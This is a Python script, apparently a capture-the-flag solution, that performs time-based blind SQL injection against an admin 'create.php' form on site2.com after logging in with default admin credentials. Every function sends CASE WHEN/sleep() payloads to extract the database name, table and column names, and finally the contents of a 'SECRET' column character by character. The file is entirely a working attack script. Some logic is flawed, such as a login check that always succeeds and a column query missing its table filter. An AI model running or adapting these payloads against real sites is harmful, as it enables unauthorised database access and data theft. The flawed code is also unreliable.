import requests

USERNAME = 'admin'
PASSWORD = 'admin'
URL = 'http://site2.com/admin/create.php'
TITLE = 'Title'
DELAY = 0.5


def create_session():
    return requests.Session()


def login(session, url='', username='', password=''):
    data = {
        'username': f'{username}',
        'password': f'{password}'
    }
    response = session.post(url=f'{url}', data=data)
    if response.content.decode().find('<p>Hello, you are <b>admin</b>'):
        print('[i] Logged in successfully')
    else:
        print('[-] Failed to log in\n')
        exit()


def find_database_length(session, url='', title=''):
    length = 1
    while True:
        content = f"1' AND CASE WHEN length(database())={length} THEN sleep({DELAY}) ELSE '2' END AND '3"
        data = {
            'title': f'{title}',
            'content': f'{content}'
        }
        response = session.post(url=f'{url}', data=data)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found length of current database name: {length}')
            break
        else:
            length += 1
    return length


def find_database_name(session, url='', title='', length=1):
    found_string = ''
    position = 1
    print(f'\t[+] Found database name: {found_string}', end='')
    while position <= length:
        for ascii_code in range(33, 126):
            content = f"1' AND CASE WHEN (SUBSTRING(DATABASE(), {position}, 1)='{chr(ascii_code)}') THEN " \
                      f"sleep({DELAY}) ELSE '2' END AND '3 "
            data = {'title': f'{title}', 'content': f'{content}'}
            response = session.post(url=f'{url}', data=data)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'{chr(ascii_code)}', end='')
                found_string += chr(ascii_code)
                position += 1
            else:
                continue
    print('')
    return found_string


def count_tables(session, url='', title='', database_name=''):
    number = 0
    while True:
        content = f"1' AND CASE WHEN (SELECT count(table_name) FROM information_schema.tables " \
                  f"WHERE table_schema='{database_name.lower()}')={number} THEN sleep({DELAY}) ELSE '2' END AND '3"
        data = {
            'title': f'{title}',
            'content': f'{content}'
        }
        response = session.post(url=f'{url}', data=data)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number} table(s) in {database_name} database')
            break
        else:
            number += 1
    return number


def find_table_lengths(session, url='', title='', database_name='', number_of_tables=None):
    table_lengths = []
    for number in range(0, number_of_tables):
        length = 0
        while True:
            content = f"1' AND CASE WHEN (SELECT length(table_name) FROM information_schema.tables " \
                      f"WHERE table_schema='{database_name.lower()}' LIMIT {number}, 1)={length} THEN sleep({DELAY}) " \
                      f"ELSE '2' END AND '3"
            data = {
                'title': f'{title}',
                'content': f'{content}'
            }
            response = session.post(url=f'{url}', data=data)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{number} table name: {length}')
                table_lengths.append(length)
                break
            else:
                length += 1
    return table_lengths


def find_table_names(session, url='', title='', database_name='', table_lengths=None):
    if table_lengths is None:
        table_lengths = []
    table_names = []
    for number in range(0, len(table_lengths)):
        table_name = ''
        position = 1
        while position <= table_lengths[number]:
            for ascii_code in range(33, 126):
                content = f"1' AND CASE WHEN (SELECT substring(table_name, {position}, 1) FROM information_schema.tables " \
                          f"WHERE table_schema='{database_name.lower()}' LIMIT {number}, 1)='{chr(ascii_code)}' THEN sleep({DELAY}) " \
                          f"ELSE '2' END AND '3"
                data = {
                    'title': f'{title}',
                    'content': f'{content}'
                }
                response = session.post(url=f'{url}', data=data)
                if response.elapsed.total_seconds() >= DELAY:
                    table_name += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{number} table name: {table_name}')
        table_names.append(table_name)
    return table_names


def count_columns(session, url='', title='', database_name='', table_name=''):
    number = 0
    while True:
        content = f"1' AND CASE WHEN (SELECT count(column_name) FROM information_schema.columns " \
                  f"WHERE table_schema='{database_name.lower()}' AND table_name='{table_name}')={number} THEN sleep({DELAY}) ELSE '2' END AND '3 "
        data = {
            'title': f'{title}',
            'content': f'{content}'
        }
        response = session.post(url=f'{url}', data=data)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number} column(s) in {table_name} table, {database_name} database')
            break
        else:
            number += 1
    return number


def find_column_lengths(session, url='', title='', database_name='', table_name='', number_of_columns=0):
    column_lengths = []
    for number in range(0, number_of_columns):
        length = 0
        while True:
            content = f"1' AND CASE WHEN (SELECT length(column_name) FROM information_schema.columns " \
                      f"WHERE table_schema='{database_name.lower()}' AND table_name='{table_name}' LIMIT {number}, 1)={length} THEN sleep({DELAY}) " \
                      f"ELSE '2' END AND '3"
            data = {
                'title': f'{title}',
                'content': f'{content}'
            }
            response = session.post(url=f'{url}', data=data)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{number} column: {length} in table {table_name}, database {database_name}')
                column_lengths.append(length)
                break
            else:
                length += 1
    return column_lengths


def find_column_names(session, url='', title='', database_name='', table_name='', column_lengths=None):
    if column_lengths is None:
        column_lengths = []
    column_names = []
    for number in range(0, len(column_lengths)):
        column_name = ''
        position = 1
        while position <= column_lengths[number]:
            for ascii_code in range(33, 126):
                content = f"1' AND CASE WHEN (SELECT substring(column_name, {position}, 1) FROM information_schema.columns " \
                          f"WHERE table_schema='{database_name.lower()}' LIMIT {number}, 1)='{chr(ascii_code)}' THEN sleep({DELAY}) " \
                          f"ELSE '2' END AND '3"
                data = {
                    'title': f'{title}',
                    'content': f'{content}'
                }
                response = session.post(url=f'{url}', data=data)
                if response.elapsed.total_seconds() >= DELAY:
                    column_name += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{number} column name: {column_name}')
        column_names.append(column_name)
    return column_names


def count_rows(session, url='', title='', table_name='', column_name=''):
    number = 0
    while True:
        content = f"1' AND CASE WHEN (SELECT count({column_name.lower()}) FROM {table_name.lower()})={number} THEN " \
                  f"sleep({DELAY}) ELSE '2' END AND '3"
        data = {
            'title': f'{title}',
            'content': f'{content}'
        }
        response = session.post(url=f'{url}', data=data)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number} row(s) in {column_name} column, {table_name} table')
            break
        else:
            number += 1
    return number


def find_row_lengths(session, url='', title='', table_name='', column_name='', number_of_rows=0):
    row_lengths = []
    for number in range(0, number_of_rows):
        length = 0
        while True:
            content = f"1' AND CASE WHEN (SELECT length({column_name.lower()}) FROM {table_name.lower()} LIMIT {number}, 1)={length} " \
                      f"THEN sleep({DELAY}) ELSE '2' END AND '3"
            data = {
                'title': f'{title}',
                'content': f'{content}'
            }
            response = session.post(url=f'{url}', data=data)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{number} row: {length} in {column_name} column, in {table_name} table')
                row_lengths.append(length)
                break
            else:
                length += 1
    return row_lengths


def find_rows(session, url='', title='', table_name='', column_name='', row_lengths=None):
    if row_lengths is None:
        row_lengths = []
    rows = []
    for number in range(0, len(row_lengths)):
        row = ''
        position = 1
        while position <= row_lengths[number]:
            for ascii_code in range(33, 126):
                content = f"1' AND CASE WHEN (SELECT substring({column_name.lower()}, {position}, 1) FROM {table_name.lower()} LIMIT {number}, 1)='{chr(ascii_code)}' THEN sleep({DELAY}) " \
                          f"ELSE '2' END AND '3"
                data = {
                    'title': f'{title}',
                    'content': f'{content}'
                }
                response = session.post(url=f'{url}', data=data)
                if response.elapsed.total_seconds() >= DELAY:
                    row += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{number} row: {row} in {column_name} column, in {table_name} table')
        rows.append(row)
    return rows


if __name__ == '__main__':
    session = create_session()
    login(session, 'http://site2.com/admin/login.php', USERNAME, PASSWORD)

    print('[i] Enumerating current database')
    db_name_length = find_database_length(session, URL, TITLE)
    database_name = find_database_name(session, URL, TITLE, db_name_length)

    print('[i] Enumerating tables in current database')
    number_of_tables = count_tables(session, URL, TITLE, database_name)
    table_lengths = find_table_lengths(session, URL, TITLE, database_name, number_of_tables)
    table_names = find_table_names(session, URL, TITLE, database_name, table_lengths)

    print('[i] Enumerating columns in desired table, current database')
    number_of_columns = count_columns(session, URL, TITLE, database_name, 'flag')
    column_lengths = find_column_lengths(session, URL, TITLE, database_name, 'flag', number_of_columns)
    column_names = find_column_names(session, URL, TITLE, database_name, 'flag', column_lengths)

    print('[i] Enumerating rows in desired column, desired table, current database')
    number_of_rows = count_rows(session, URL, TITLE, 'FLAG', 'SECRET')
    row_lengths = find_row_lengths(session, URL, TITLE, 'FLAG', 'SECRET', number_of_rows)
    rows = find_rows(session, URL, TITLE, 'FLAG', 'SECRET', row_lengths)
